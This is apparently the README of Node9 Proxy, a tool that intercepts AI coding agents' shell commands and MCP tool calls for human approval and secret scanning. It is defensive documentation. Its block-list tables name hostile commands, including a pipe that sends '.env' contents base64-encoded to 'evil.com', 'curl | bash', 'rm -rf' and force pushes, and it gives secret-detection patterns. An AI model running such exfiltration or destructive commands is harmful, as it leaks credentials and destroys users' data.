# 🛡️ Node9 Proxy

### The "Sudo" Command for AI Agents.

[![NPM Version](https://img.shields.io/npm/v/@node9/proxy.svg)](https://www.npmjs.com/package/@node9/proxy)
[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Open in HF Spaces](https://huggingface.co/datasets/huggingface/badges/resolve/main/open-in-hf-spaces-sm.svg)](https://huggingface.co/spaces/Node9ai/node9-security-demo)
[![Documentation](https://img.shields.io/badge/docs-node9.ai%2Fdocs-blue)](https://node9.ai/docs)

**Node9** is the execution security layer for the Agentic Era. It encases autonomous AI Agents (Claude Code, Gemini CLI, Cursor, MCP Servers) in a deterministic security wrapper, intercepting dangerous shell commands and tool calls before they execute.

While others try to _guess_ if a prompt is malicious (Semantic Security), Node9 _governs_ the actual action (Execution Security).

📖 **[Full Documentation →](https://node9.ai/docs)**

---

## Contents

|                                                   |                                                    |
| ------------------------------------------------- | -------------------------------------------------- |
| [💎 The Aha Moment](#-the-aha-moment)             | [🌐 MCP Gateway](#-mcp-gateway)                    |
| [⚡ Key Features](#-key-features)                 | [🤖 MCP Server](#-node9-mcp-server)                |
| [🎮 Try it Live](#-try-it-live)                   | [🔗 Config Precedence](#-configuration-precedence) |
| [🚀 Quick Start](#-quick-start)                   | [⚙️ Custom Rules](#️-custom-rules-advanced)         |
| [🛡️ How Protection Works](#️-how-protection-works) | [🖥️ CLI Reference](#️-cli-reference)                |
| [🛠 Protection Modes](#-protection-modes)         | [🗺️ Roadmap](#️-roadmap)                            |

---

## 💎 The "Aha!" Moment

**AIs are literal.** When you ask an agent to "Fix my disk space," it might decide to run `docker system prune -af`.

**With Node9, the interaction looks like this:**

1. **🤖 AI attempts a "Nuke":** `Bash("docker system prune -af --volumes")`
2. **🛡️ Node9 Intercepts:** An OS-native popup appears immediately.
3. **🛑 User Blocks:** You click "Block" in the popup.
4. **🧠 AI Negotiates:** Node9 explains the block to the AI. The AI responds: _"I understand. I will pivot to a safer cleanup, like removing only large log files instead."_

---

## ⚡ Key Features

### 🏁 The Multi-Channel Race Engine

Node9 initiates a **Concurrent Race** across all enabled channels. The first channel to receive a human signature wins and instantly cancels the others:

- **Native Popup:** OS-level dialog (Mac/Win/Linux) for sub-second keyboard dismissal.
- **Browser Dashboard:** Local web UI for deep inspection of large payloads (SQL/Code).
- **Cloud (Slack):** Remote asynchronous approval for team governance.
- **Terminal:** Classic `[Y/n]` prompt for manual proxy usage and SSH sessions.

### 🛰️ Flight Recorder — See Everything, Instantly

Node9 records every tool call your AI agent makes in real-time — no polling, no log files, no refresh. Two ways to watch:

<p align="center">
  <img src="https://github.com/user-attachments/assets/7b22e0fb-35ff-4088-8ee9-cc23216f362f" width="100%">
</p>

**Browser Dashboard** (`node9 daemon start` → `localhost:7391`)

A live 3-column dashboard. The left column streams every tool call as it happens, updating in-place from `● PENDING` to `✓ ALLOW` or `✗ BLOCK`. The center handles pending approvals. The right sidebar controls shields and persistent decisions — all without ever causing a browser scrollbar.

**Terminal** (`node9 tail`)

A split-pane friendly stream for terminal-first developers and SSH sessions:

```bash
node9 tail                # live events only
node9 tail --history      # replay recent history then go live
node9 tail | grep DLP     # filter to DLP blocks only
```

```
🛰️  Node9 tail  → localhost:7391
Showing live events. Press Ctrl+C to exit.

21:06:58 📖 Read            {"file_path":"src/core.ts"}            ✓ ALLOW
21:06:59 🔍 Grep            {"pattern":"authorizeHeadless"}        ✓ ALLOW
21:07:01 💻 Bash            {"command":"npm run build"}            ✓ ALLOW
21:07:04 💻 Bash            {"command":"curl … Bearer sk-ant-…"}   ✗ BLOCK 🛡️ DLP
```

`node9 tail` auto-starts the daemon if it isn't running — no setup step needed.

After approving the same tool 3+ times, every channel (terminal, browser, native popup) shows a 💡 insight: _"Approved N× before — 'Always Allow' creates a permanent rule."_ Approved and denied cards stay stamped in the terminal history so you always know what was decided and when.

### 🧠 AI Negotiation Loop

Node9 doesn't just "cut the wire." When a command is blocked, it injects a **Structured Negotiation Prompt** back into the AI's context window. This teaches the AI why it was stopped and instructs it to pivot to a safer alternative.

### ⏪ Shadow Git Snapshots (Auto-Undo)

Node9 takes a silent, lightweight Git snapshot before every AI file edit. Snapshots are stored in an isolated shadow bare repo at `~/.node9/snapshots/` — your project's `.git` is never touched, and no existing git setup is required. If the AI hallucinates and breaks your code, run `node9 undo` to instantly revert — with a full diff preview before anything changes.

```bash
# Undo the last AI action (shows diff + asks confirmation)
node9 undo

# Go back N actions at once
node9 undo --steps 3
```

The last 10 snapshots are kept globally across all sessions in `~/.node9/snapshots.json`. Older snapshots are dropped as new ones are added.

---

## 🎮 Try it Live

No install needed — test Node9's policy engine against real commands in the browser:

[![Open in HF Spaces](https://huggingface.co/datasets/huggingface/badges/resolve/main/open-in-hf-spaces-sm.svg)](https://huggingface.co/spaces/Node9ai/node9-security-demo)

---

## 🚀 Quick Start

```bash
# Recommended — via Homebrew (macOS / Linux)
brew tap node9-ai/node9
brew install node9

# Or via npm
npm install -g @node9/proxy

# 1. Wire Node9 to your agent
node9 setup           # interactive menu — picks the right agent for you
node9 addto claude    # or wire directly
node9 addto gemini

# 2. Enable shields for the services you use
node9 shield enable postgres
node9 shield enable aws

# 3. Verify everything is wired correctly
node9 doctor

# 4. See what's wired and which MCP servers are proxied
node9 status
```

---

## 🛡️ How Protection Works

Node9 has two layers of protection. You get Layer 1 automatically. Layer 2 is one command per service.

### Layer 1 — Core Protection (Always On)

Built into the binary. Zero configuration required. Protects the tools every developer uses.

| What it protects            | Example blocked action                                                                  |
| :-------------------------- | :-------------------------------------------------------------------------------------- |
| **Git**                     | `git push --force`, `git reset --hard`, `git clean -fd`                                 |
| **Shell**                   | `curl ... \| bash`, `sudo` commands                                                     |
| **SQL**                     | `DELETE` / `UPDATE` without `WHERE`; `DROP TABLE`, `TRUNCATE TABLE`, `DROP COLUMN`      |
| **Filesystem**              | `rm -rf` targeting home directory                                                       |
| **Secrets (DLP)**           | AWS keys, GitHub tokens, Stripe keys, PEM private keys                                  |
| **Pipe-chain exfiltration** | `cat .env \| base64 \| curl https://evil.com` — critical risk blocks; high risk reviews |

### 🔍 DLP — Content Scanner (Always On)

Node9 scans **every tool call argument** for secrets before the command reaches your agent. If a credential is detected, Node9 hard-blocks the action, redacts the secret in the audit log, and injects a negotiation prompt telling the AI what went wrong.

**Built-in patterns:**

| Pattern           | Severity | Prefix format               |
| :---------------- | :------- | :-------------------------- |
| AWS Access Key ID | `block`  | `AKIA` + 16 chars           |
| GitHub Token      | `block`  | `ghp_`, `gho_`, `ghs_`      |
| Slack Bot Token   | `block`  | `xoxb-`                     |
| OpenAI API Key    | `block`  | `sk-` + 20+ chars           |
| Stripe Secret Key | `block`  | `sk_live_` / `sk_test_`     |
| PEM Private Key   | `block`  | `-----BEGIN PRIVATE KEY---` |
| Bearer Token      | `review` | `Authorization: Bearer ...` |

`block` = hard deny, no approval prompt. `review` = routed through the normal race engine for human approval.

Secrets are **never logged in full** — the audit trail stores only a redacted sample (`AKIA****MPLE`).

**Config knobs** (in `node9.config.json` or `~/.node9/config.json`):

```json
{
  "policy": {
    "dlp": {
      "enabled": true,
      "scanIgnoredTools": true
    }
  }
}
```

| Key                    | Default | Description                                                        |
| :--------------------- | :------ | :----------------------------------------------------------------- |
| `dlp.enabled`          | `true`  | Master switch — disable to turn off all DLP scanning               |
| `dlp.scanIgnoredTools` | `true`  | Also scan tools in `ignoredTools` (e.g. `web_search`, `read_file`) |

### Layer 2 — Shields (Opt-in, Per Service)

Shields add protection for specific infrastructure and services — only relevant if you actually use them.

| Shield       | What it protects                                                                                                |
| :----------- | :-------------------------------------------------------------------------------------------------------------- |
| `postgres`   | Hard-blocks `DROP TABLE`, `TRUNCATE`, `DROP COLUMN` (upgrades Layer 1 review → block); reviews `GRANT`/`REVOKE` |
| `github`     | Blocks `gh repo delete`; reviews remote branch deletion                                                         |
| `aws`        | Blocks S3 bucket deletion, EC2 termination; reviews IAM changes, RDS deletion                                   |
| `filesystem` | Reviews `chmod 777`, writes to `/etc/`                                                                          |

```bash
node9 shield enable postgres    # protect your database
node9 shield enable aws         # protect your cloud infrastructure
node9 shield list               # see all available shields
node9 shield status             # see what's currently active
```

### 🔓 Trusted Hosts

Node9 blocks any pipe-chain that sends sensitive files to the network. If the destination is **your own internal API or logging service**, that friction is unnecessary. Trusted hosts let you declare known-safe destinations:

```bash
node9 trust add api.mycompany.com      # exact FQDN
node9 trust add *.logs.mycompany.com   # wildcard — matches any subdomain at any depth (api.logs.mycompany.com, us.api.logs.mycompany.com, …) but NOT bare logs.mycompany.com
node9 trust list                        # see the full list
node9 trust remove api.mycompany.com   # remove a host
```

Once a host is trusted, pipe-chain decisions are downgraded for that destination only:

| Pipe-chain risk                                  | Untrusted destination | Trusted destination |
| :----------------------------------------------- | :-------------------- | :------------------ |
| **critical** (obfuscated, e.g. `base64 \| curl`) | **block**             | review              |
| **high** (direct, e.g. `cat .env \| curl`)       | review                | **allow**           |

If **any** sink in the pipeline is untrusted, the original decision stands. Trusted hosts are stored in `~/.node9/trusted-hosts.json` and can only be modified via the CLI — AI tool calls cannot touch this list.

---

## 🛠 Protection Modes

| Mode            | Target                        | How it works                                                             |
| :-------------- | :---------------------------- | :----------------------------------------------------------------------- |
| **Hook Mode**   | Claude Code, Gemini, Cursor   | `node9 addto <agent>` wires native pre-execution hooks.                  |
| **MCP Gateway** | Any MCP server, any AI client | `node9 mcp-gateway --upstream <cmd>` wraps any MCP server transparently. |
| **Manual Mode** | You                           | `node9 rm -rf /` protects you from your own typos.                       |

---

## 🌐 MCP Gateway

The MCP Gateway is a **transparent stdio proxy** that sits between any AI agent and any MCP server. The agent doesn't know Node9 is there — it just sees the same MCP server it always did.

```
AI Agent (Claude, Cursor, Gemini…)
    ↓ stdio  (JSON-RPC)
Node9 MCP Gateway  ← intercepts every tools/call
    ↓ stdio  (JSON-RPC)
Upstream MCP Server (filesystem, postgres, browser…)
```

**Every `tools/call` is intercepted.** Read-only tools pass through silently. Write/mutate tools are routed through the full approval engine — DLP scan, smart rules, shields, and human approval.

### Setup

**1. Register any MCP server through the gateway:**

```bash
# Filesystem server — protect all file writes
claude mcp add filesystem -- node9 mcp-gateway --upstream \
  "npx -y @modelcontextprotocol/server-filesystem /your/workspace"

# Any other MCP server — same pattern
claude mcp add myserver -- node9 mcp-gateway --upstream \
  "npx -y @some/mcp-server"
```

**2. Add globally (all projects):**

```bash
claude mcp add --scope user filesystem -- node9 mcp-gateway --upstream \
  "npx -y @modelcontextprotocol/server-filesystem /home/you"
```

**3. Share with your team via `.mcp.json` in the repo:**

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "node9",
      "args": ["mcp-gateway", "--upstream", "npx -y @modelcontextprotocol/server-filesystem ."]
    }
  }
}
```

> **Note:** `--upstream` takes a single command string. The gateway's tokenizer splits it on whitespace and handles double-quoted paths (e.g. `"npx \"/path with spaces/server.js\""`) — it does not run a shell.
>
> ⚠️ **Supply-chain warning:** `.mcp.json` files from untrusted repositories can specify any `--upstream` command. Always review `.mcp.json` before using it — treat it with the same caution as a `Makefile` or `package.json` `postinstall` script.

### What gets protected

The same `ignoredTools`, smart rules, shields, and DLP that protect hook-mode tools apply here — but matched against **MCP tool names** (e.g. `write_file`, `execute_query`) instead of Claude's built-in tools.

**Tune your config for MCP tool names:**

```json
{
  "policy": {
    "ignoredTools": ["read_file", "read_text_file", "list_*", "search_*"],
    "toolInspection": {
      "write_file": "content",
      "execute_query": "sql",
      "run_command": "command"
    }
  }
}
```

**Add MCP-specific smart rules:**

```json
{
  "policy": {
    "smartRules": [
      {
        "name": "block-write-production-config",
        "tool": "write_file",
        "conditions": [{ "field": "path", "op": "matches", "value": "/etc/|/prod/" }],
        "verdict": "block",
        "reason": "Writes to production config require a manual change process"
      }
    ]
  }
}
```

### How blocked calls look to the AI

When Node9 blocks an MCP tool call, it returns a structured JSON-RPC error that tells the AI exactly what happened and instructs it to pivot:

```json
{
  "jsonrpc": "2.0",
  "id": 42,
  "error": {
    "code": -32000,
    "message": "NODE9 SECURITY ALERT: Action blocked by DLP — credential detected in content field. Do NOT retry. Remove the hardcoded secret and use an environment variable instead."
  }
}
```

---

## 🤖 Node9 MCP Server

The Node9 MCP Server exposes node9 capabilities — starting with undo — as native MCP tools that Claude, Cursor, and Gemini can call directly. Unlike the MCP Gateway (which wraps _other_ servers), this server is node9's own surface.

```
Claude / Cursor / Gemini  (MCP client)
    ↓ stdio  (JSON-RPC 2.0)
Node9 MCP Server          ← this process
    ↓ direct function calls
~/.node9/snapshots.json   ← undo history
```

### Setup

The MCP server is registered **automatically** during `node9 init` or `node9 setup`. No separate step needed. What gets added to your agent config:

```json
{
  "mcpServers": {
    "node9": {
      "command": "node9",
      "args": ["mcp-server"]
    }
  }
}
```

### Available Tools

| Tool                | Description                                                           |
| :------------------ | :-------------------------------------------------------------------- |
| `node9_undo_list`   | List snapshot history — hash, tool, summary, files changed, timestamp |
| `node9_undo_revert` | Revert the working directory to a specific snapshot hash              |

### Example — Claude using the MCP server

```
You: revert the last change node9 captured

Claude: Let me check the snapshot history first.
[calls node9_undo_list]

[1] a3f2c1d  4/4/2026, 18:15  Write — src/undo.ts  (3 files)  cwd: /home/user/myproject
    full hash: a3f2c1d8e9b0f1a2b3c4d5e6f7a8b9c0d1e2f3a4

I'll revert to snapshot a3f2c1d.
[calls node9_undo_revert with hash: "a3f2c1d8e9b0f1a2b3c4d5e6f7a8b9c0d1e2f3a4"]

Successfully reverted to snapshot a3f2c1d in /home/user/myproject.
```

### Manual testing

```bash
npm run build
node dist/cli.js mcp-server
# paste JSON-RPC lines:
{"jsonrpc":"2.0","method":"initialize","id":1,"params":{"protocolVersion":"2024-11-05","clientInfo":{"name":"test"},"capabilities":{}}}
{"jsonrpc":"2.0","method":"tools/list","id":2}
{"jsonrpc":"2.0","method":"tools/call","id":3,"params":{"name":"node9_undo_list","arguments":{}}}
```

---

## 🔗 Configuration Precedence

Node9 merges configuration from multiple sources in priority order. Higher tiers win:

| Tier | Source                    | Notes                                                     |
| :--- | :------------------------ | :-------------------------------------------------------- |
| 1    | **Environment variables** | `NODE9_MODE=strict` overrides everything                  |
| 2    | **Cloud / Org policy**    | Set in the Node9 dashboard — cannot be overridden locally |
| 3    | **Project config**        | `node9.config.json` in the working directory              |
| 4    | **Global config**         | `~/.node9/config.json`                                    |
| 5    | **Built-in defaults**     | Always active, no config needed                           |

**Settings** (mode, approvers, timeouts) follow the table above — higher tier wins. A project config overrides a global config.

**Smart rules** work differently. All layers are concatenated into a single ordered list and evaluated first-match-wins:

```
built-in defaults → global config → project config → shields → advisory defaults
```

Because built-in `block` rules sit at the front of this list, they always fire before any user-defined `allow` rule. **A project or global config cannot bypass Layer 1 protection.** Within the user layers, a project `block` rule fires before a shield `block` rule — so project policy can tighten or selectively override a shield.

---

## ⚙️ Custom Rules (Advanced)

Most users never need this. If you need protection beyond Layer 1 and the available shields, add **Smart Rules** to `node9.config.json` in your project root or `~/.node9/config.json` globally.

Smart Rules match on **raw tool arguments** using structured conditions:

```json
{
  "policy": {
    "smartRules": [
      {
        "name": "block-prod-deploy",
        "tool": "bash",
        "conditions": [
          { "field": "command", "op": "matches", "value": "kubectl.*--namespace=production" }
        ],
        "verdict": "block",
        "reason": "Deploying to production requires a manual release process"
      }
    ]
  }
}
```

**Smart Rule fields:**

| Field             | Description                                                                                                                                                                                                                              |
| :---------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `tool`            | Tool name or glob (`"bash"`, `"mcp__postgres__*"`, `"*"`)                                                                                                                                                                                |
| `conditions`      | Array of conditions evaluated against the raw args object                                                                                                                                                                                |
| `conditionMode`   | `"all"` (AND, default) or `"any"` (OR)                                                                                                                                                                                                   |
| `verdict`         | `"review"` (approval prompt) \| `"block"` (hard deny) \| `"allow"` (skip all checks)                                                                                                                                                     |
| `reason`          | Human-readable explanation shown in the approval prompt and audit log                                                                                                                                                                    |
| `dependsOnState`  | _(optional)_ Array of state predicates — block only fires when **all** are true. If any predicate is false or the daemon is unreachable the rule is downgraded to review (fail-open). See [Stateful Rules](#stateful-smart-rules) below. |
| `recoveryCommand` | _(optional)_ Shell command to suggest when the rule blocks — shown on terminal as `💡 Run: npm test` and sent to the AI as a negotiation hint.                                                                                           |

### Stateful Smart Rules

Stateful rules let you block actions based on **what the AI has done earlier in the session**, not just what it's doing now. The canonical use case: block deployment unless a test has passed since the last file edit.

```json
{
  "policy": {
    "smartRules": [
      {
        "name": "require-tests-before-deploy",
        "tool": "Bash",
        "conditions": [
          {
            "field": "command",
            "op": "matches",
            "value": "./deploy.sh|kubectl apply|npm run deploy"
          }
        ],
        "verdict": "block",
        "reason": "Run tests before deploying",
        "dependsOnState": ["no_test_passed_since_last_edit"],
        "recoveryCommand": "npm test"
      }
    ]
  }
}
```

**How it works:**

1. The AI attempts a deploy command.
2. Node9 checks the daemon: _"Has a test passed since the last file edit?"_
3. **If no** → routes to the race engine. Terminal shows the STATE GUARD card with `[1] Allow / [2] Redirect AI to run tests / [3] Deny`. The AI receives a negotiation hint to run `npm test` first if the human redirects.
4. **If yes** → the rule is skipped, normal approval flow continues.
5. **Daemon unreachable** → fail-open, rule is skipped.

> **⚠️ Security note — fail-open behaviour:** When the daemon is unreachable, stateful block rules are silently downgraded to review. This is intentional (availability over lockout), but it means a network disruption can temporarily weaken these rules. A per-rule `failMode: 'closed'` option is planned. If you need a hard guarantee, use a plain block rule (no `dependsOnState`) instead.

**State is tracked automatically** — no config required beyond the rule itself:

- File edits are detected from `Edit`, `Write`, `MultiEdit` tool calls.
- Test results are detected from the PostToolUse hook reading command output. Supported runners: `vitest`, `jest`, `mocha`, `pytest`, `cargo test`, `go test`, `rspec`, `phpunit`, `dotnet test`.

**Available predicates:**

| Predicate                        | True when                                                     |
| :------------------------------- | :------------------------------------------------------------ |
| `no_test_passed_since_last_edit` | A file was edited and no passing test has been recorded since |

> **Requires the node9 daemon** (`node9 daemon start`). Without the daemon the predicate is always unknown → fail-open.

**Condition operators:**

| `op`             | Meaning                                                                    |
| :--------------- | :------------------------------------------------------------------------- |
| `matches`        | Field value matches regex (`value` = pattern, `flags` = e.g. `"i"`)        |
| `notMatches`     | Field value does not match regex (`value` = pattern, `flags` optional)     |
| `contains`       | Field value contains substring                                             |
| `notContains`    | Field value does not contain substring                                     |
| `exists`         | Field is present and non-empty                                             |
| `notExists`      | Field is absent or empty                                                   |
| `matchesGlob`    | Field value matches a glob pattern (`value` = e.g. `"**/node_modules/**"`) |
| `notMatchesGlob` | Field value does not match a glob pattern                                  |

The `field` key supports dot-notation for nested args: `"params.query.sql"`.

Use `node9 explain <tool> <args>` to dry-run any tool call and see exactly which rule would trigger.

### Settings

```json
{
  "version": "1.0",
  "settings": {
    "mode": "audit",
    "enableUndo": true,
    "flightRecorder": true,
    "approvalTimeoutMs": 30000,
    "approvers": {
      "native": true,
      "browser": true,
      "cloud": false,
      "terminal": true
    }
  }
}
```

| Key                  | Default   | Description                                                                                   |
| :------------------- | :-------- | :-------------------------------------------------------------------------------------------- |
| `mode`               | `"audit"` | `audit` \| `observe` \| `standard` \| `strict` — see [Security Modes](#-security-modes) below |
| `enableUndo`         | `true`    | Take git snapshots before every AI file edit                                                  |
| `flightRecorder`     | `true`    | Record tool call activity to the flight recorder ring buffer for the browser UI               |
| `approvalTimeoutMs`  | `30000`   | Auto-deny after N ms if no human responds (`0` = wait forever)                                |
| `approvers.native`   | `true`    | OS-native popup                                                                               |
| `approvers.browser`  | `true`    | Browser dashboard (`node9 daemon`)                                                            |
| `approvers.cloud`    | `false`   | Slack / SaaS approval — requires `node9 login`; opt-in only                                   |
| `approvers.terminal` | `true`    | `[Y/n]` prompt in terminal                                                                    |

## 🔒 Security Modes

| Mode       | Blocks? | Runs rules? | Use when                                                                     |
| :--------- | :------ | :---------- | :--------------------------------------------------------------------------- |
| `audit`    | Never   | No          | You want a log of every tool call but never want node9 to interfere          |
| `observe`  | Never   | Yes         | New install — see what _would_ have been blocked before enabling enforcement |
| `standard` | Yes     | Yes         | Normal use — dangerous commands need human approval                          |
| `strict`   | Yes     | Yes         | High-security — anything not explicitly allowed is denied                    |

**`audit` vs `observe`:** Both never block. The difference is that `audit` skips the policy pipeline entirely (zero overhead, pure logging), while `observe` runs smart rules and DLP in full — recording each `would-block` decision without acting on it. The HUD shows `⚠ N would-block` in observe mode so you can see what enforcement would look like in practice.

**Recommended path:** start on `observe` for a few days to build confidence, then switch to `standard`.

---

## 🛡️ Security Statusline (HUD)

When Claude Code is detected, `node9 init` automatically adds a **security statusline** to Claude Code's terminal UI. You can also add it manually:

```bash
node9 setup hud        # add to ~/.claude/settings.json
node9 setup hud --remove
```

The HUD renders up to three lines below Claude Code's prompt:

```
🛡 node9  |  standard  |  ✅ 14 allowed  🛑 1 blocked  ⚡ require-tests-before-deploy
claude-opus-4-5  │ ctx ████████░░ 82%  │ 5h ██████░░░░ 61% (43m left)
2 CLAUDE.md  |  5 rules  |  3 MCPs  |  2 hooks
```

| Segment            | Source                      | Notes                                                    |
| :----------------- | :-------------------------- | :------------------------------------------------------- |
| `standard`         | daemon: current mode        | changes colour in `strict` (red) and `observe` (magenta) |
| `✅ N allowed`     | daemon: session counters    | resets when the daemon restarts                          |
| `🛑 N blocked`     | daemon: session counters    | shown in red when > 0                                    |
| `⚠ N would-block`  | daemon: session counters    | shown instead of blocked/allowed in `observe` mode       |
| `⚡ rule-name`     | daemon: last smart rule hit | most recent rule that fired                              |
| Context bar        | Claude Code stdin           | token usage and rate limit windows                       |
| Environment counts | local config files          | CLAUDE.md / rules / MCPs / hooks active in this project  |

When the daemon is not running the HUD shows `🛡 node9 | offline` instead of an error.

---

## 🖥️ CLI Reference

| Command                              | Description                                                                           |
| :----------------------------------- | :------------------------------------------------------------------------------------ |
| `node9 setup`                        | Interactive menu — detects installed agents and wires hooks for you                   |
| `node9 addto <agent>`                | Wire hooks for a specific agent (`claude`, `gemini`, `cursor`)                        |
| `node9 setup hud`                    | Add the node9 security statusline to Claude Code (also done automatically by `init`)  |
| `node9 init`                         | Create default config, wire detected agents, and set up the HUD                       |
| `node9 status`                       | Show current protection status and active rules                                       |
| `node9 doctor`                       | Health check — verifies binaries, config, credentials, and all agent hooks            |
| `node9 shield <cmd>`                 | Manage shields (`enable`, `disable`, `list`, `status`)                                |
| `node9 trust add <host>`             | Add a host to the trusted list — pipe-chain blocks to this host are downgraded        |
| `node9 trust remove <host>`          | Remove a trusted host                                                                 |
| `node9 trust list`                   | Show all trusted hosts                                                                |
| `node9 tail [--history]`             | Stream live agent activity to the terminal (auto-starts daemon if needed)             |
| `node9 explain <tool> [args]`        | Trace the policy waterfall for a given tool call (dry-run, no approval prompt)        |
| `node9 undo [--steps N]`             | Revert the last N AI file edits using shadow Git snapshots                            |
| `node9 mcp-gateway --upstream <cmd>` | Wrap an MCP server with Node9 security — intercepts every tool call                   |
| `node9 mcp-server`                   | Run the Node9 MCP server — exposes undo and other tools to Claude, Cursor, and Gemini |
| `node9 check`                        | Called by agent hooks; evaluates a pending tool call and exits 0 (allow) or 1 (block) |

### `node9 doctor`

```
Node9 Doctor  v1.2.0
────────────────────────────────────────
Binaries
  ✅  Node.js v20.11.0
  ✅  git version 2.43.0

Configuration
  ✅  ~/.node9/config.json found and valid
  ✅  ~/.node9/credentials.json — cloud credentials found

Agent Hooks
  ✅  Claude Code — PreToolUse hook active
  ⚠️  Gemini CLI — not configured (optional)
  ⚠️  Cursor — not configured (optional)

────────────────────────────────────────
All checks passed ✅
```

### `node9 explain`

Dry-runs the policy engine and prints exactly which rule would fire — useful for debugging:

```bash
node9 explain bash '{"command":"rm -rf /tmp/build"}'
```

```
Policy Waterfall for: bash
──────────────────────────────────────────────
Tier 1 · Cloud Org Policy       SKIP  (no org policy loaded)
Tier 2 · Dangerous Words        BLOCK ← matched "rm -rf"
──────────────────────────────────────────────
Verdict: BLOCK  (dangerous word: rm -rf)
```

---

## 🔧 Troubleshooting

**`node9 check` exits immediately / Claude is never blocked**
Node9 fails open by design to prevent breaking your agent. Check debug logs: `NODE9_DEBUG=1 claude`. Also verify you are in `standard` or `strict` mode — the default `audit` mode approves everything and only logs.

**Terminal prompt never appears during Claude/Gemini sessions**
Interactive agents run hooks in a "Headless" subprocess. You **must** enable `native: true` or `browser: true` in your config to see approval prompts.

**"Blocked by Organization (SaaS)"**
A corporate policy has locked this action. You must click the "Approve" button in your company's Slack channel to proceed.

**`node9 tail --history` says "Daemon failed to start" even though the daemon is running**
This can happen when the daemon's PID file (`~/.node9/daemon.pid`) is missing — for example after a crash or a botched restart left a daemon running without a PID file. Node9 now detects this automatically: it performs an HTTP health probe and a live port check before deciding the daemon is gone. If you hit this on an older version, run `node9 daemon stop` then `node9 daemon -b` to create a clean PID file.

---

## 🗺️ Roadmap

- [x] **Multi-Channel Race Engine** (Simultaneous Native/Browser/Cloud/Terminal)
- [x] **AI Negotiation Loop** (Instructional feedback loop to guide LLM behavior)
- [x] **Resolution Waterfall** (Cascading configuration: Env > Cloud > Project > Global)
- [x] **Native OS Dialogs** (Sub-second approval via Mac/Win/Linux system windows)
- [x] **Shadow Git Snapshots** (1-click Undo for AI hallucinations)
- [x] **Identity-Aware Execution** (Differentiates between Human vs. AI risk levels)
- [x] **Shield Templates** (`node9 shield enable <service>` — one-click protection for Postgres, GitHub, AWS)
- [x] **Content Scanner / DLP** (Detect and block secrets like AWS keys and Bearer tokens in-flight)
- [x] **Flight Recorder** (Real-time activity stream in browser dashboard and `node9 tail` terminal view)
- [x] **Universal MCP Gateway** (Transparent stdio proxy — wraps any MCP server for any AI agent: `node9 mcp-gateway --upstream <cmd>`)
- [x] **Node9 MCP Server** (Native MCP tools for Claude/Cursor/Gemini: `node9_undo_list`, `node9_undo_revert` — auto-registered by `node9 init`)
- [ ] **Cursor & Windsurf Hook** (Native hook support for AI-first IDEs)
- [ ] **VS Code Extension** (Approval requests in a native sidebar — no more OS popups)
- [ ] **Execution Sandboxing** (Simulate dangerous commands in a virtual FS before applying)
- [ ] **Multi-Admin Quorum** (Require 2+ human signatures for high-stakes production actions)
- [ ] **SOC2 Tamper-proof Audit Trail** (Cryptographically signed, cloud-managed logs)

---

## 🔗 Related

- [node9-python](https://github.com/node9-ai/node9-python) — Python SDK for Node9

---

## 🏢 Enterprise & Compliance

Node9 Pro provides **Governance Locking**, **SAML/SSO**, and **VPC Deployment**.
Visit [node9.ai](https://node9.ai)
